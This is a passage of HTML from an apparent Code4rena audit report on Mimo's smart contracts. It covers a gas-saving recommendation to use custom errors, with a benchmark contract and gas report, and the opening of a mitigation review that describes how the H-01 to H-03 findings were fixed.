5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>12.3. Use assembly to write storage values</h3>\n<h2 id=\"g-13-use-custom-errors-instead-of-revert-strings-to-save-gas\" style=\"position:relative;\"><a href=\"#g-13-use-custom-errors-instead-of-revert-strings-to-save-gas\" aria-label=\"g 13 use custom errors instead of revert strings to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-13] Use Custom Errors instead of Revert Strings to save Gas</h2>\n<p>Custom errors are available from solidity version 0.8.4. Custom errors save <a href=\"https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746\"><strong>~50 gas</strong></a> each time they’re hit by <a href=\"https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth\">avoiding having to allocate and store the revert string</a>. Not defining the strings also save deployment gas</p>\n<p>Additionally, custom errors can be used inside and outside of contracts (including interfaces and libraries).</p>\n<p>Source: <a href=\"https://blog.soliditylang.org/2021/04/21/custom-errors/\">https://blog.soliditylang.org/2021/04/21/custom-errors/</a>:</p>\n<blockquote>\n<p>Starting from <a href=\"https://github.com/ethereum/solidity/releases/tag/v0.8.4\">Solidity v0.8.4</a>, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., <code>revert(\"Insufficient funds.\");</code>), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.</p>\n</blockquote>\n<p><strong>POC Contract:</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">GasTest</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">DSTest</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Contract0</span><span class=\"mtk1\"> </span><span class=\"mtk12\">c0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Contract1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">c1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setUp</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">c0</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Contract0</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">c1</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Contract1</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testFailGas</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">c0</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stringErrorMessage</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">c1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">customErrorMessage</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Contract0</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">stringErrorMessage</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">check</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">check</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;error message&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Contract1</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">error</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CustomError</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">customErrorMessage</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">check</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">check</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CustomError</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong>POC Gas Report:</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">│ </span><span class=\"mtk12\">Contract0</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> ┆                 ┆     ┆        ┆     ┆         │</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">│ </span><span class=\"mtk12\">Deployment</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Cost</span><span class=\"mtk1\">    ┆ </span><span class=\"mtk12\">Deployment</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Size</span><span class=\"mtk1\"> ┆     ┆        ┆     ┆         │</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">│ </span><span class=\"mtk7\">34087</span><span class=\"mtk1\">              ┆ </span><span class=\"mtk7\">200</span><span class=\"mtk1\">             ┆     ┆        ┆     ┆         │</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">│ </span><span class=\"mtk10\">Function</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Name</span><span class=\"mtk1\">      ┆ </span><span class=\"mtk12\">min</span><span class=\"mtk1\">             ┆ </span><span class=\"mtk12\">avg</span><span class=\"mtk1\"> ┆ </span><span class=\"mtk12\">median</span><span class=\"mtk1\"> ┆ </span><span class=\"mtk12\">max</span><span class=\"mtk1\"> ┆ # </span><span class=\"mtk12\">calls</span><span class=\"mtk1\"> │</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">│ </span><span class=\"mtk12\">stringErrorMessage</span><span class=\"mtk1\"> ┆ </span><span class=\"mtk7\">218</span><span class=\"mtk1\">             ┆ </span><span class=\"mtk7\">218</span><span class=\"mtk1\"> ┆ </span><span class=\"mtk7\">218</span><span class=\"mtk1\">    ┆ </span><span class=\"mtk7\">218</span><span class=\"mtk1\"> ┆ </span><span class=\"mtk7\">1</span><span class=\"mtk1\">       │</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">│ </span><span class=\"mtk12\">Contract1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> ┆                 ┆     ┆        ┆     ┆         │</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">│ </span><span class=\"mtk12\">Deployment</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Cost</span><span class=\"mtk1\">    ┆ </span><span class=\"mtk12\">Deployment</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Size</span><span class=\"mtk1\"> ┆     ┆        ┆     ┆         │</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">│ </span><span class=\"mtk7\">26881</span><span class=\"mtk1\">              ┆ </span><span class=\"mtk7\">164</span><span class=\"mtk1\">             ┆     ┆        ┆     ┆         │</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">│ </span><span class=\"mtk10\">Function</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Name</span><span class=\"mtk1\">      ┆ </span><span class=\"mtk12\">min</span><span class=\"mtk1\">             ┆ </span><span class=\"mtk12\">avg</span><span class=\"mtk1\"> ┆ </span><span class=\"mtk12\">median</span><span class=\"mtk1\"> ┆ </span><span class=\"mtk12\">max</span><span class=\"mtk1\"> ┆ # </span><span class=\"mtk12\">calls</span><span class=\"mtk1\"> │</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">│ </span><span class=\"mtk12\">customErrorMessage</span><span class=\"mtk1\"> ┆ </span><span class=\"mtk7\">161</span><span class=\"mtk1\">             ┆ </span><span class=\"mtk7\">161</span><span class=\"mtk1\"> ┆ </span><span class=\"mtk7\">161</span><span class=\"mtk1\">    ┆ </span><span class=\"mtk7\">161</span><span class=\"mtk1\"> ┆ </span><span class=\"mtk7\">1</span><span class=\"mtk1\">       │</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯</span></span></span></code></pre>\n<p>Consider replacing all revert strings with custom errors in the solution.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">actions</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOEmptyVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">96</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">flashloanRepayAmount</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">vaultCollateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">CANNOT_REPAY_FLASHLOAN</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">actions</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOLeverage</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">130</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralBalanceAfter</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">flashloanRepayAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">CANNOT_REPAY_FLASHLOAN</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">actions</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMORebalance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">129</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">actions</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOSwap</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">47</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proxy</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INVALID_AGGREGATOR</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">actions</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOSwap</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">48</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">router</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INVALID_AGGREGATOR</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/74#issuecomment-1219156215\">m19 (Mimo) commented</a>:</strong></p>\n<blockquote>\n<p>We found this gas report really outstanding.</p>\n</blockquote>\n<hr>\n<h1 id=\"mitigation-review\" style=\"position:relative;\"><a href=\"#mitigation-review\" aria-label=\"mitigation review permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation Review</h1>\n<p><em>Mitigation review by horsefacts</em></p>\n<p><strong>Review PR:</strong> <a href=\"https://github.com/mimo-capital/2022-08-mimo/pull/1\">https://github.com/mimo-capital/2022-08-mimo/pull/1</a></p>\n<p><strong>Final review commit:</strong> <code>093f46e870cf22d12c373db37e361bf27fc97661</code></p>\n<h2 id=\"intro\" style=\"position:relative;\"><a href=\"#intro\" aria-label=\"intro permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Intro</h2>\n<p>The Mimo team engaged Code4rena to review mitigations related to their <a href=\"https://code4rena.com/contests/2022-08-mimo-august-2022-contest\">August 2022</a> audit contest.</p>\n<p>C4 mitigation reviews are time-boxed best efforts conducted by an individual warden. The findings documented in this report do not guarantee the absence of any further vulnerabilities.</p>\n<h2 id=\"mitigation-overview\" style=\"position:relative;\"><a href=\"#mitigation-overview\" aria-label=\"mitigation overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation Overview</h2>\n<p>The following is an overview of the issues identified during the audit contest and the related mitigations.</p>\n<h3 id=\"h-01-mimoemptyvaultsol-executeoperation-does-not-transfer-the-vault-leftover-assets-to-the-owner-it-is-locked-in-the-mimoemptyvault-1\" style=\"position:relative;\"><a href=\"#h-01-mimoemptyvaultsol-executeoperation-does-not-transfer-the-vault-leftover-assets-to-the-owner-it-is-locked-in-the-mimoemptyvault-1\" aria-label=\"h 01 mimoemptyvaultsol executeoperation does not transfer the vault leftover assets to the owner it is locked in the mimoemptyvault 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[H-01] <strong>MIMOEmptyVault.sol executeOperation() does not transfer the Vault leftover assets to the owner, it is locked in the MIMOEmptyVault</strong></h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/18\">Github Issue</a></p>\n<p><strong>Status:</strong> ✅ Resolved</p>\n<p><strong>Finding:</strong> Wardens identified that <code>MIMOEmptyVault</code> transferred in a vault’s full collateral balance when repaying vault rebalance flash loans, but did not return excess collateral to the vault owner when the flash loan repayment amount was less than the vault’s collateral balance. Instead, the excess amount would be locked in the action contract.</p>\n<p><strong>What changed:</strong> The Mimo team updated <code>MIMOEmptyVault#emptyVaultOperation</code> to transfer collateral exactly equal to the <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/contracts/actions/MIMOEmptyVault.sol#L142\">flashloan repayment amount</a>, rather than the full vault balance. This behavior is demonstrated by an <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/test/02_integration/MIMOEmtpyVault.test.ts#L297\">integration test</a>.</p>\n<p><strong>Why it works:</strong> Since excess collateral is never transferred to <code>MIMOEmptyVault</code>, it can no longer be locked in the contract.</p>\n<h3 id=\"h-02-automation--management-can-be-set-for-not-yet-existing-vault-1\" style=\"position:relative;\"><a href=\"#h-02-automation--management-can-be-set-for-not-yet-existing-vault-1\" aria-label=\"h 02 automation  management can be set for not yet existing vault 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[H-02] <strong>Automation / management can be set for not yet existing vault</strong></h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/68\">Github Issue</a></p>\n<p><strong>Status:</strong> ✅ Resolved after review (see finding M.H-01 below)</p>\n<p><strong>Finding:</strong> Wardens identified that malicious callers could configure automation and management parameters for uninitialized vaults when vault owner and proxy address were unset for a given vault ID and caller and returned <code>adress(0)</code>, which caused an access control check to unintentionally pass.</p>\n<p><strong>What changed:</strong> <code>MIMOAutoAction#setAutomation</code> now <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/contracts/actions/automated/MIMOAutoAction.sol#L34\">checks</a> whether the vault owner is the zero address. An <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/test/02_integration/automated/MIMOAutoActionSecurity.test.ts#L119\">integration test</a> demonstrates that attempting to call <code>setAutomation</code> on an uninitialized vault will revert. <code>MIMOManagedAction#setAutomation</code> performs the same <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5a63c76ed74186d11d3adb361d3b3aacefa7795e/contracts/actions/managed/MIMOManagedAction.sol#L37\">check</a>, and an <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5a63c76ed74186d11d3adb361d3b3aacefa7795e/test/01_unit/managed/MIMOManagedAction.test.ts#L123\">integration test</a> exercises it.  </p>\n<p><strong>Why it works:</strong> Since <code>setAutomation</code> now explicitly checks that the vault is initialized, configuration cannot be set for an uninitialized vault.</p>\n<h3 id=\"h-03-registrysol-fails-to-deliver-expected-functionality-1\" style=\"position:relative;\"><a href=\"#h-03-registrysol-fails-to-deliver-expected-functionality-1\" aria-label=\"h 03 registrysol fails to deliver expected functionality 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[H-03] <strong>Registry.sol fails to deliver expected functionality</strong></h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/78\">Github Issue</a></p>\n<p><strong>Status:</strong> ✅ Resolved</p>\n<p><strong>Finding:</strong> Wardens identified that both <code>MIMOProxy</code> and 